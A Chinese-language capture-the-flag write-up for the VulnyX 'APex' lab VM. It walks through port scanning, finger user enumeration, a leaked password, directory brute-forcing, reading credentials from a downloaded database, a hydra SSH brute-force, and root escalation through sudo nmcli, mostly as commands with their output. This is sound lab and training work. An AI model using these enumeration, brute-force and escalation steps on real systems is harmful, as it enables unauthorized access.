# 0.简介

**靶机**：[vulnyx - APex](https://vulnyx.com/file/APex.php)
**难度**：Easy
**目标 IP**：192.168.205.148
**本机 IP**：192.168.205.141

# 1.扫描

`nmap`起手

```
┌──(kali㉿kali)-[~/test]
└─$ nmap -sS --min-rate 10000 -p- -Pn 192.168.205.148
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-22 19:17 CST
Nmap scan report for 192.168.205.148
Host is up (0.00026s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
79/tcp open  finger
80/tcp open  http
MAC Address: 08:00:27:8E:D9:36 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.56 seconds

```

其中79是我没有见过的服务，优先级最高

# 2.踩点

在hacktricks搜索到了相关[网页](https://book.hacktricks.wiki/zh/network-services-pentesting/pentesting-finger.html#79---pentesting-finger)

![Image](https://github.com/user-attachments/assets/f8704be5-49b0-4ede-8d26-fae86b96ee0a)

有Metasploit的脚本，我们优先利用一下

```bash
┌──(kali㉿kali)-[~/test]
└─$ msfconsole
msf6 > use auxiliary/scanner/finger/finger_users
msf6 auxiliary(scanner/finger/finger_users) > show options 

Module options (auxiliary/scanner/finger/finger_users):

   Name        Current Setting                        Required  Description
   ----        ---------------                        --------  -----------
   RHOSTS                                             yes       The target host(s), see https://docs.metasploit.com/docs/using-metas
                                                                ploit/basics/using-metasploit.html
   RPORT       79                                     yes       The target port (TCP)
   THREADS     1                                      yes       The number of concurrent threads (max one per host)
   USERS_FILE  /usr/share/metasploit-framework/data/  yes       The file that contains a list of default UNIX accounts.
               wordlists/unix_users.txt


View the full module info with the info, or info -d command.

msf6 auxiliary(scanner/finger/finger_users) > set RHOSTS 192.168.205.148
RHOSTS => 192.168.205.148
msf6 auxiliary(scanner/finger/finger_users) > run
[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: _apt
[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: backup
[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: bin
[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: daemon
[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: dnsmasq
[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: games
[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: gnats
[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: irc
[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: list
[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: lp
[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: mail
[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: man
[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: messagebus
[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: news
[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: nobody
[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: proxy
[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: root
[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: sshd
[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: sync
[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: sys
[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: systemd-coredump
[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: systemd-network
[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: systemd-resolve
[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: systemd-timesync
[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: uucp
[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: uuidd
[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: www-data
[+] 192.168.205.148:79    - 192.168.205.148:79 Users found: _apt, backup, bin, daemon, dnsmasq, games, gnats, irc, list, lp, mail, man, messagebus, news, nobody, proxy, root, sshd, sync, sys, systemd-coredump, systemd-network, systemd-resolve, systemd-timesync, uucp, uuidd, www-data
[*] 192.168.205.148:79    - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

```

提取数据进行爆破

```bash
┌──(kali㉿kali)-[~/test]
└─$ cat user |awk -F ': ' '{print $2}'
_apt
backup
bin
daemon
dnsmasq
games
gnats
irc
list
lp
mail
man
messagebus
news
nobody
proxy
root
sshd
sync
sys
systemd-coredump
systemd-network
systemd-resolve
systemd-timesync
uucp
uuidd
www-data
┌──(kali㉿kali)-[~/test]
└─$ while read -r user; do echo "$user" | nc -vn 192.168.205.148 79; done < user
(UNKNOWN) [192.168.205.148] 79 (finger) open
Login: _apt                             Name: 
Directory: /nonexistent                 Shell: /usr/sbin/nologin
Never logged in.
No mail.
No Plan.
(UNKNOWN) [192.168.205.148] 79 (finger) open
Login: backup                           Name: backup
Directory: /var/backups                 Shell: /usr/sbin/nologin
Never logged in.
No mail.
No Plan.
(UNKNOWN) [192.168.205.148] 79 (finger) open
Login: bin                              Name: bin
Directory: /bin                         Shell: /usr/sbin/nologin
Never logged in.
No mail.
No Plan.
(UNKNOWN) [192.168.205.148] 79 (finger) open
Login: daemon                           Name: daemon
Directory: /usr/sbin                    Shell: /usr/sbin/nologin
Never logged in.
No mail.
No Plan.
(UNKNOWN) [192.168.205.148] 79 (finger) open
Login: dnsmasq                          Name: dnsmasq
Directory: /var/lib/misc                Shell: /usr/sbin/nologin
Never logged in.
No mail.
No Plan.
(UNKNOWN) [192.168.205.148] 79 (finger) open
Login: games                            Name: games
Directory: /usr/games                   Shell: /usr/sbin/nologin
Never logged in.
No mail.
No Plan.
(UNKNOWN) [192.168.205.148] 79 (finger) open
Login: gnats                            Name: Gnats Bug-Reporting System (admin)
Directory: /var/lib/gnats               Shell: /usr/sbin/nologin
Never logged in.
No mail.
No Plan.
(UNKNOWN) [192.168.205.148] 79 (finger) open
Login: irc                              Name: ircd
Directory: /run/ircd                    Shell: /usr/sbin/nologin
Never logged in.
No mail.
No Plan.
(UNKNOWN) [192.168.205.148] 79 (finger) open
Login: list                             Name: Mailing List Manager
Directory: /var/list                    Shell: /usr/sbin/nologin
Never logged in.
No mail.
No Plan.
(UNKNOWN) [192.168.205.148] 79 (finger) open
Login: lp                               Name: lp
Directory: /var/spool/lpd               Shell: /usr/sbin/nologin
Never logged in.
No mail.
No Plan.
(UNKNOWN) [192.168.205.148] 79 (finger) open
Login: mail                             Name: mail
Directory: /var/mail                    Shell: /usr/sbin/nologin
Never logged in.
No mail.
No Plan.
(UNKNOWN) [192.168.205.148] 79 (finger) open
Login: man                              Name: man
Directory: /var/cache/man               Shell: /usr/sbin/nologin
Never logged in.
No mail.
No Plan.
(UNKNOWN) [192.168.205.148] 79 (finger) open
Login: messagebus                       Name: 
Directory: /nonexistent                 Shell: /usr/sbin/nologin
Never logged in.
No mail.
No Plan.
(UNKNOWN) [192.168.205.148] 79 (finger) open
Login: news                             Name: news
Directory: /var/spool/news              Shell: /usr/sbin/nologin
Never logged in.
No mail.
No Plan.
(UNKNOWN) [192.168.205.148] 79 (finger) open
Login: nobody                           Name: nobody
Directory: /nonexistent                 Shell: /usr/sbin/nologin
Never logged in.
No mail.
No Plan.
(UNKNOWN) [192.168.205.148] 79 (finger) open
Login: proxy                            Name: proxy
Directory: /bin                         Shell: /usr/sbin/nologin
Never logged in.
No mail.
No Plan.
(UNKNOWN) [192.168.205.148] 79 (finger) open
Login: root                             Name: root
Directory: /root                        Shell: /bin/bash
Never logged in.
No mail.
No Plan.
(UNKNOWN) [192.168.205.148] 79 (finger) open
Login: sshd                             Name: 
Directory: /run/sshd                    Shell: /usr/sbin/nologin
Never logged in.
No mail.
No Plan.
(UNKNOWN) [192.168.205.148] 79 (finger) open
Login: sync                             Name: sync
Directory: /bin                         Shell: /bin/sync
Never logged in.
No mail.
No Plan.
(UNKNOWN) [192.168.205.148] 79 (finger) open
Login: sys                              Name: sys
Directory: /dev                         Shell: /usr/sbin/nologin
Never logged in.
No mail.
No Plan.
(UNKNOWN) [192.168.205.148] 79 (finger) open
Login: systemd-coredump                 Name: systemd Core Dumper
Directory: /                            Shell: /usr/sbin/nologin
Never logged in.
No mail.
No Plan.
(UNKNOWN) [192.168.205.148] 79 (finger) open
Login: systemd-network                  Name: systemd Network Management
Directory: /run/systemd                 Shell: /usr/sbin/nologin
Never logged in.
No mail.
No Plan.
(UNKNOWN) [192.168.205.148] 79 (finger) open
Login: systemd-resolve                  Name: systemd Resolver
Directory: /run/systemd                 Shell: /usr/sbin/nologin
Never logged in.
No mail.
No Plan.
(UNKNOWN) [192.168.205.148] 79 (finger) open
Login: systemd-timesync                 Name: systemd Time Synchronization
Directory: /run/systemd                 Shell: /usr/sbin/nologin
Never logged in.
No mail.
No Plan.
(UNKNOWN) [192.168.205.148] 79 (finger) open
Login: uucp                             Name: uucp
Directory: /var/spool/uucp              Shell: /usr/sbin/nologin
Never logged in.
No mail.
No Plan.
(UNKNOWN) [192.168.205.148] 79 (finger) open
Login: uuidd                            Name: 
Directory: /run/uuidd                   Shell: /usr/sbin/nologin
Never logged in.
No mail.
No Plan.
(UNKNOWN) [192.168.205.148] 79 (finger) open
Login: www-data                         Name: www-data
Directory: /var/www                     Shell: /usr/sbin/nologin
Never logged in.
No mail.
No Plan.

```

没有有意思的东西，我们去看看Web服务吧

![Image](https://github.com/user-attachments/assets/0729089c-c77a-498c-919d-b511a966991b)

没有有意思的东西，源码也没有，我们去爆破目录

```bash
┌──(kali㉿kali)-[~/test]
└─$ gobuster dir -u "http://192.168.205.148" -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -x php,html,txt,md
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.205.148
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,txt,md,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/backup               (Status: 401) [Size: 462]
/index.html           (Status: 200) [Size: 878]
/server-status        (Status: 403) [Size: 280]
/.html                (Status: 403) [Size: 280]

```

![Image](https://github.com/user-attachments/assets/0b5297e8-5474-4c34-a645-bc01e1b882d7)

好像找到重点了，扫描一下架构

```bash
┌──(kali㉿kali)-[~/test]
└─$ nuclei -u 192.168.205.148                    

                     __     _
   ____  __  _______/ /__  (_)
  / __ \/ / / / ___/ / _ \/ /
 / / / / /_/ / /__/ /  __/ /
/_/ /_/\__,_/\___/_/\___/_/   v3.3.8

                projectdiscovery.io

[WRN] Found 2 templates with runtime error (use -validate flag for further examination)
[INF] Current nuclei version: v3.3.8 (latest)
[INF] Current nuclei-templates version: v10.1.2 (latest)
[WRN] Scan results upload to cloud is disabled.
[INF] New templates added in latest release: 52
[INF] Templates loaded for current scan: 7656
[INF] Executing 7276 signed templates from projectdiscovery/nuclei-templates
[WRN] Loading 380 unsigned templates for scan. Use with caution.
[INF] Targets loaded for current scan: 1
[INF] Running httpx on input host
[INF] Found 1 URL from httpx
[INF] Templates clustered: 1698 (Reduced 1598 Requests)
[INF] Using Interactsh Server: oast.fun
[waf-detect:apachegeneric] [http] [info] http://192.168.205.148
[ssh-sha1-hmac-algo] [javascript] [info] 192.168.205.148:22
[ssh-server-enumeration] [javascript] [info] 192.168.205.148:22 ["SSH-2.0-OpenSSH_8.4p1 Debian-5+deb11u3"]
[ssh-password-auth] [javascript] [info] 192.168.205.148:22
[ssh-auth-methods] [javascript] [info] 192.168.205.148:22 ["["publickey","password"]"]
[openssh-detect] [tcp] [info] 192.168.205.148:22 ["SSH-2.0-OpenSSH_8.4p1 Debian-5+deb11u3"]
[options-method] [http] [info] http://192.168.205.148 ["HEAD,GET,POST,OPTIONS"]
[http-missing-security-headers:x-frame-options] [http] [info] http://192.168.205.148
[http-missing-security-headers:x-content-type-options] [http] [info] http://192.168.205.148
[http-missing-security-headers:cross-origin-embedder-policy] [http] [info] http://192.168.205.148
[http-missing-security-headers:cross-origin-resource-policy] [http] [info] http://192.168.205.148
[http-missing-security-headers:strict-transport-security] [http] [info] http://192.168.205.148
[http-missing-security-headers:content-security-policy] [http] [info] http://192.168.205.148
[http-missing-security-headers:permissions-policy] [http] [info] http://192.168.205.148
[http-missing-security-headers:cross-origin-opener-policy] [http] [info] http://192.168.205.148
[http-missing-security-headers:x-permitted-cross-domain-policies] [http] [info] http://192.168.205.148
[http-missing-security-headers:referrer-policy] [http] [info] http://192.168.205.148
[http-missing-security-headers:clear-site-data] [http] [info] http://192.168.205.148
[apache-detect] [http] [info] http://192.168.205.148 ["Apache/2.4.62 (Debian)"]

```

无果，拷一份网站下来，还是没有东西。仔细想想好像就只有那个法老有特色了，搜一下

![Image](https://github.com/user-attachments/assets/7b416ee3-6a1d-4b80-af63-1f7082cc352e)

等会，不会是在那个79服务看这个人的信息吧

```bash
┌──(kali㉿kali)-[~/test]
└─$ nc -vn 192.168.205.148 79
(UNKNOWN) [192.168.205.148] 79 (finger) open
Horus
finger: Horus: no such user.
                                                                                                                                   
┌──(kali㉿kali)-[~/test]
└─$ nc -vn 192.168.205.148 79
(UNKNOWN) [192.168.205.148] 79 (finger) open
horus    
Login: horus                            Name: 
Directory: /home/horus                  Shell: /bin/bash
Never logged in.
Mail forwarded to horus@point.nyx
No mail.
PGP key:
personal notes: H0Ru$$3rv3
No Plan.
```

我去.....

![Image](https://github.com/user-attachments/assets/eeaaa4aa-fc48-4495-aa84-0f190d6c8afa)

下载下来看看

```bash
┌──(kali㉿kali)-[~/test]
└─$ sqlite3 ~/Downloads/database.db 
SQLite version 3.46.1 2024-08-13 09:16:08
Enter ".help" for usage hints.
sqlite> .tables
users
sqlite> select * from users
   ...> ;
1|anubis|L44NxKRnP7wxrBsxibpDORySkbEHRO
2|amon|xqRu08ZA3BihR4lKdJVYcP1x6HjZUf
3|seth|Hm7iYkj2jXDxPUwoW2COs42YjPaC4P
4|osiris|ITA96l3isg4uV2Sm8eYn41XVfxprFy
```

尝试爆破

```bash
┌──(kali㉿kali)-[~/test]
└─$ cat tmp|awk -F '|' '{print $2}'
anubis
amon
seth
osiris

                                                                                                                                   
┌──(kali㉿kali)-[~/test]
└─$ cat tmp|awk -F '|' '{print $2}' > user
                                                                                                                                   
┌──(kali㉿kali)-[~/test]
└─$ cat user    
anubis
amon
seth
osiris

                                                                                                                                   
┌──(kali㉿kali)-[~/test]
└─$ cat tmp|awk -F '|' '{print $3}' > pass
                                                                                                                                   
┌──(kali㉿kali)-[~/test]
└─$ cat pass                          
L44NxKRnP7wxrBsxibpDORySkbEHRO
xqRu08ZA3BihR4lKdJVYcP1x6HjZUf
Hm7iYkj2jXDxPUwoW2COs42YjPaC4P
ITA96l3isg4uV2Sm8eYn41XVfxprFy

                                    
```

hydra启动

```bash
┌──(kali㉿kali)-[~/test]
└─$ hydra -L user -P pass ssh://192.168.205.148 -I -u -f -e nsr -t 64 
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-01-22 19:49:56
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 40 tasks per 1 server, overall 40 tasks, 40 login tries (l:5/p:8), ~1 try per task
[DATA] attacking ssh://192.168.205.148:22/
[22][ssh] host: 192.168.205.148   login: seth   password: xqRu08ZA3BihR4lKdJVYcP1x6HjZUf
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-01-22 19:49:58

```

登录

```bash
┌──(kali㉿kali)-[~/test]
└─$ ssh seth@192.168.205.148   
The authenticity of host '192.168.205.148 (192.168.205.148)' can't be established.
ED25519 key fingerprint is SHA256:3dqq7f/jDEeGxYQnF2zHbpzEtjjY49/5PvV5/4MMqns.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.205.148' (ED25519) to the list of known hosts.
seth@192.168.205.148's password: 
seth@apex:~$ id
uid=1001(seth) gid=1001(seth) grupos=1001(seth)

```

# 3.提权

```bash
seth@apex:~$ sudo -l
-bash: sudo: orden no encontrada
seth@apex:~$ which sudo
seth@apex:~$ cat /etc/sudo
sudo.conf          sudoers            sudoers.d/         sudo_logsrvd.conf  
seth@apex:~$ cat /etc/sudoers
cat: /etc/sudoers: Permiso denegado
seth@apex:~$ /etc/sudo -l
-bash: /etc/sudo: No existe el fichero o el directorio
seth@apex:~$ find / -name sudo 2>/dev/null
/var/lib/sudo
/etc/init.d/sudo
/etc/pam.d/sudo
/run/sudo
/usr/sbin/sudo
/usr/share/lintian/overrides/sudo
/usr/share/bash-completion/completions/sudo
/usr/share/doc/sudo
/usr/lib/sudo
seth@apex:~$ /run/sudo -l
-bash: /run/sudo: Es un directorio
seth@apex:~$ /usr/sbin/sudo -l
Matching Defaults entries for seth on apex:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User seth may run the following commands on apex:
    (root) NOPASSWD: /usr/bin/nmcli

```

还真有人干这事啊，然后我就卡住了。等到8点群里大佬发了wp我才发现又是缩小提权

![Image](https://github.com/user-attachments/assets/925d251b-9ebe-4070-8f1d-29c36a9ff4b3)

在城南花已开大佬的wp看到了原理：

![Image](https://github.com/user-attachments/assets/de0b5181-4c5f-48bd-a894-4e312e8c9bb8)

```bash
!/bin/bash
root@apex:/home/seth# iduid=0(root) gid=0(root) grupos=0(root)
```

以下也是大佬的思路

![Image](https://github.com/user-attachments/assets/1d094ada-fae5-4d7d-987a-79cae98e0126)